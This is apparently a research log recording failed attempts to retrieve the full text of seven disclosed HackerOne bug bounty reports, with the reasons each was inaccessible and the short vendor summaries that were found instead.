- 1406938 — Genuinely disclosed (Dropbox program, 'Full Response SSRF via Google Drive', bounty $17,576 per the researcher's own writeup) but full body text could not be retrieved: direct/browser fetch returns HTTP 403 (Cloudflare 'Just a moment...' challenge), and the public .json API endpoint that worked for all 5 other reports (hackerone.com/reports/<id>.json) returns a clean HTTP 404 for this id specifically, on repeated attempts over several minutes. The only genuine (non-aggregator) fragment recovered was a truncated ~350-character og:description meta tag from a 2022 Wayback Machine snapshot ('This researcher pointed out that HelloSign's Google Drive doc export feature had a URL parsing issue ... which leads to an SSRF attack. We updated the parser to securely make a request which...') — this is a truncated one-paragraph team summary, not the report body, so per the task's own rule ('a one-line/summary is NOT access') this does not count as real access. The researcher's own technique writeup (github.com/httpvoid/writeups/blob/main/Hacking-Google-Drive-Integrations.md) discusses the general SSRF technique and credits this exact report/bounty but explicitly declines to reproduce the report text ('the bug was pretty simple as such I'm just pointing this section to the report'), so it supplies context but not verbatim report quotes. — https://hackerone.com/reports/1406938
- 591813 — HackerOne's own report API returns visibility: 'no-content' and an empty vulnerability_information field for this report - the original submitted body was never disclosed. Only a short third-person team-authored summary is public ('A username and certificate was found that allows API access to Phabricator on code.uberinternal.com...' written by an Uber staff member, not by tomnomnom). Per task rules a summary is not the body, so this is marked inaccessible rather than quoted as tomnomnom's own writing. — https://hackerone.com/reports/591813
- 202781 — Same as 591813: visibility is 'no-content' and vulnerability_information is empty. Only a team-authored (Uber staffer) third-person paraphrase of ngalog's chained-OAuth-redirect bug is public ('The Facebook OAuth application was misconfigured to allow any URL that followed the https://auth.uber.com/login?* format...'). No verbatim researcher-authored report text is available, so it cannot be used as an example of ngalog's own voice. — https://hackerone.com/reports/202781
- 488147 — HackerOne's public JSON endpoint returns this report with visibility="no-content" (vulnerability_information field empty) -- the body is gated behind login/team-membership despite the report being publicly disclosed. Direct WebFetch of the rendered page only returns the client-side SPA shell (title "HackerOne", no body). An archive.org snapshot (e.g. 2019-10-23) is also just the same unrendered SPA shell; its only real content is a truncated meta/og:description summary sentence ("Due to a configuration in frontend, caching servers, it was possible for a researcher to use request smuggling to convert a page request into a cached redirect..."), which per the task's own rule counts as a one-line summary, not the body. No independent researcher writeup of this specific report (by albinowax) was found via search; related PortSwigger posts discuss the general technique, not this report's verbatim text. — https://hackerone.com/reports/488147
- 383127 — Same as above: JSON endpoint visibility="no-content", empty vulnerability_information. Direct page fetch returns only the SPA shell. Archive.org has several snapshots (2018-2020) but they are the same client-rendered shell with no body text captured (report content in this app is loaded dynamically via API calls the crawler didn't capture). No blog/mirror writeup with the actual body text (containing the countryFilter[] SQLi details) was found; the reporter's own comment on HackerOne ("Wait for the write-up ;)") suggests any external writeup, if it exists, was not located. — https://hackerone.com/reports/383127
- 221294 — Same pattern: JSON endpoint visibility="no-content", empty vulnerability_information; live page and archive.org snapshots (2017-2024, several captures exist) are all the unrendered SPA shell. No independent full-text mirror or blog writeup of this specific report's body was found (joaomatosf's public GitHub work, e.g. jexboss/JavaDeserH2HC, covers the general JBossMQ deserialization technique/CVE-2017-7504 but is not a copy of this report's verbatim text). — https://hackerone.com/reports/221294
- 1842674 — Report visibility is 'no-content': the reporter's (mikemyers) own write-up was never made public, even at disclosure. Both the live hackerone.com/reports/1842674.json response and an archive.org snapshot taken the same day it was disclosed (2023-02-22T09:58, snapshot 20230222191915) return an empty vulnerability_information field and an empty 'researcher' summary. Only a third-party, team-authored summary (written by krisp's 'noisekiller', crediting @mikemyers) is public — that is a paraphrase by the vendor, not the researcher's own verbatim text, so no genuine first-person quotes could be extracted. — https://hackerone.com/reports/1842674

